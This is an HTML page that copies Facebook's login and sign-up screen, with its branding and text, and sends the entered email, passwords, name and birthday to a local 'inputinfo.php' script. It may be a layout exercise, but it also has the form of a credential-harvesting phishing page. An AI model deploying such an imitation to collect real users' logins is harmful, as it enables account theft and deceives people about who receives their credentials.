<!DOCTYPE html>
<html>
<head>
	<title>Facebook Log in</title>
</head>
	<link rel="stylesheet" type="text/css" href="Style/design.css">
<body>

	<form method="POST" action="inputinfo.php">
		
		<div id="content">
			<header>
				<h1>facebook</h1>
				<label class="email1">
					Email or Phone
				</label>
				<label class="pass">
					Password
				</label>



				<input type="email" name="email" class="emailinput">
				
				<input type="password" name="loginpass" class="passinput">

				<a href="">Forgot Account?</a>
		
				<button type="submit" name="logbtn" class="login">Log in</button>



			</header>
			<nav>

				<h2>
					Connected with friends and the <br>world around you on Facebook.
				</h2>

				<p class="text1">
					<b>See Photos and updates</b> from friends in News Feed.
				</p>

				<p class="text2">
					<b>Share what's new</b> in your life on your Timeline.
				</p>

				<p class="text3">
					<b>Find more</b> of what you're looking for with Facebook Search.
				</p>








			</nav>
			<main>

				<h3>
					Sign Up
				</h3>
				<p class="text4">
					It's quick and easy.
				</p>
				<input type="text" name="fname" placeholder="First Name" class="fname">
				<input type="text" name="lname" placeholder="Last Name" class="lname">
				<input type="email" name="username" placeholder="Mobile number or email" class="email">
				<input type="password" name="password" placeholder="New Password" class="signpassword">
				<label class="birthday">Birthday</label><br>
				<input type="date" name="birthdate" class="birthday2">
		
				<label class="gender">Gender</label><br>
				<div class="gender1">
				<input type="radio" name="gender" value="Female">Female
				<input type="radio" name="gender" value="Male">Male
				<input type="radio" name="gender" value="Custom">Custom
				</div>



				<p class="text5">By clicking Sign Up, you agree to our Terms, Data Policy and <br>Cookies Policy. You may receive SMS Notifications from us and <br>can opt out any time.</p>


				<button type="submit" name="signbtn" class="signbutton"> Sign Up</button>



			</main>


		</div>




	</form>

	
</body>
</html>